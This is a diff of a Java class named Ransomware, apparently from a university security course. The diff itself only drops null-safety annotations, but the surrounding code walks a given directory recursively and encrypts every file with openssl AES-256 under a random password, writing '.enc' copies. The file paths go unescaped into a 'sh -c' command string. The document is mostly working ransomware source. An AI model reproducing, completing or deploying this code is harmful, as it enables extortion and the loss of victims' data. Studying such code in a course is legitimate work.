@@ -1,15 +1,12 @@
 package pl.edu.cybertron.ransomware;
 
-import org.jetbrains.annotations.NotNull;
-
 import java.io.File;
 import java.io.FileNotFoundException;
 import java.util.ArrayList;
-import java.util.Objects;
 import java.util.Random;
 
 public class Ransomware {
-    public static void main(String @NotNull [] args) throws Exception {
+    public static void main(String[] args) throws Exception {
 
         if (args.length != 1) {
             throw new Exception("Expected directory path in runtime arguments");
@@ -35,7 +32,7 @@ public class Ransomware {
         for (File file : files) {
             String path = file.getAbsolutePath();
             String new_path = path + ".enc";
-            String command = "openssl aes-256-cbc -e -salt -pbkdf2 -in \"" + path + "\" -out \"" + new_path + "\" -k \"" + random_password + "\"";
+            String command = "openssl aes-256-cbc -e -salt -pbkdf2 -in \"" + path + "\" -out \"" + new_path + "\" -k \"" + random_password.toString() + "\"";
             System.out.println(command);
 
             builder.command("sh", "-c", command);
@@ -45,11 +42,11 @@ public class Ransomware {
         }
     }
 
-    public static @NotNull ArrayList<File> getFiles(@NotNull File file) throws FileNotFoundException {
+    public static ArrayList<File> getFiles(File file) throws FileNotFoundException {
         ArrayList<File> files = new ArrayList<>();
 
         if (file.isDirectory()) {
-            for (File dfile : Objects.requireNonNull(file.listFiles())) {
+            for (File dfile : file.listFiles()) {
                 files.addAll(getFiles(dfile));
             }
         }
@@ -59,6 +56,7 @@ public class Ransomware {
         else {
             throw new FileNotFoundException("File not found");
         }
+
         return files;
     }
 }
